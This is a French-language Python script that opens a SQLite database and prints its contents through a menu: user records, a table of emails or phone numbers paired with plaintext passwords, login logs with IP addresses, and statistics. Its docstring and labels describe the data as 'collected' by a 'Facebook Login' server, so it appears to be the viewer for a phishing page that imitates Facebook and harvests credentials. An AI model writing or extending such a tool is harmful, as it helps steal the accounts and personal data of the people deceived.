#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Script pour afficher les données collectées par le serveur Facebook Login
"""

import sqlite3
import json
from datetime import datetime
from tabulate import tabulate  # pip install tabulate

DATABASE = 'facebook.db'

def print_header(title):
    """Afficher un en-tête"""
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80 + "\n")

def show_users():
    """Afficher tous les utilisateurs enregistrés"""
    print_header("UTILISATEURS ENREGISTRÉS")
    
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, firstname, lastname, email, birth_date, gender, created_at 
            FROM users
        ''')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            print("❌ Aucun utilisateur trouvé\n")
            return
        
        headers = ["ID", "Prénom", "Nom", "Email", "Date Naiss.", "Sexe", "Créé le"]
        print(tabulate(users, headers=headers, tablefmt="grid"))
        print(f"\n✓ Total: {len(users)} utilisateur(s)\n")
    
    except Exception as e:
        print(f"❌ Erreur: {e}\n")

def show_connection_data():
    """Afficher toutes les données de connexion (email/phone + mots de passe)"""
    print_header("DONNÉES DE CONNEXION (EMAIL/PHONE + MOTS DE PASSE)")
    
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, email_or_phone, password, timestamp 
            FROM connection_data 
            ORDER BY timestamp DESC
        ''')
        data = cursor.fetchall()
        conn.close()
        
        if not data:
            print("❌ Aucune donnée de connexion trouvée\n")
            return
        
        headers = ["ID", "Email/Téléphone", "Mot de passe", "Horodatage"]
        print(tabulate(data, headers=headers, tablefmt="grid"))
        print(f"\n✓ Total: {len(data)} tentative(s) collectée(s)\n")
    
    except Exception as e:
        print(f"❌ Erreur: {e}\n")

def show_login_logs():
    """Afficher les logs de connexion"""
    print_header("LOGS DE CONNEXION")
    
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, email_or_phone, success, ip_address, timestamp 
            FROM login_logs 
            ORDER BY timestamp DESC 
            LIMIT 50
        ''')
        logs = cursor.fetchall()
        conn.close()
        
        if not logs:
            print("❌ Aucun log de connexion trouvé\n")
            return
        
        # Convertir success en texte
        logs_formatted = []
        for log in logs:
            success_text = "✓ Succès" if log[2] == 1 else "✗ Échoué"
            logs_formatted.append([log[0], log[1], success_text, log[3], log[4]])
        
        headers = ["ID", "Email/Téléphone", "Résultat", "IP", "Horodatage"]
        print(tabulate(logs_formatted, headers=headers, tablefmt="grid"))
        print(f"\n✓ Total: {len(logs)} log(s) affiché(s) (max 50 derniers)\n")
    
    except Exception as e:
        print(f"❌ Erreur: {e}\n")

def show_stats():
    """Afficher les statistiques"""
    print_header("STATISTIQUES")
    
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM login_logs')
        total_logins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM login_logs WHERE success = 1')
        successful_logins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM login_logs WHERE success = 0')
        failed_logins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM connection_data')
        total_connections = cursor.fetchone()[0]
        
        conn.close()
        
        print(f"  👥 Utilisateurs enregistrés: {total_users}")
        print(f"  🔑 Total de tentatives de connexion: {total_logins}")
        print(f"  ✓ Connexions réussies: {successful_logins}")
        print(f"  ✗ Connexions échouées: {failed_logins}")
        print(f"  📝 Données de connexion collectées: {total_connections}")
        
        if total_logins > 0:
            success_rate = (successful_logins / total_logins) * 100
            print(f"  📊 Taux de succès: {success_rate:.1f}%")
        
        print()
    
    except Exception as e:
        print(f"❌ Erreur: {e}\n")

def main():
    """Menu principal"""
    print("\n" + "=" * 80)
    print("  📘 VISUALISEUR DE DONNÉES - Facebook Login Backend")
    print("=" * 80 + "\n")
    
    while True:
        print("Choisissez une option:\n")
        print("  1. Afficher les utilisateurs enregistrés")
        print("  2. Afficher les données de connexion (emails + mots de passe)")
        print("  3. Afficher les logs de connexion")
        print("  4. Afficher les statistiques")
        print("  5. Afficher tout")
        print("  0. Quitter\n")
        
        choice = input("Votre choix: ").strip()
        
        if choice == '1':
            show_users()
        elif choice == '2':
            show_connection_data()
        elif choice == '3':
            show_login_logs()
        elif choice == '4':
            show_stats()
        elif choice == '5':
            show_users()
            show_connection_data()
            show_login_logs()
            show_stats()
        elif choice == '0':
            print("\n👋 Au revoir!\n")
            break
        else:
            print("\n❌ Option invalide\n")

if __name__ == '__main__':
    try:
        # Essayer d'importer tabulate
        from tabulate import tabulate
    except ImportError:
        print("\n⚠️  Module 'tabulate' non trouvé")
        print("Installation: pip install tabulate\n")
        import sys
        sys.exit(1)
    
    main()
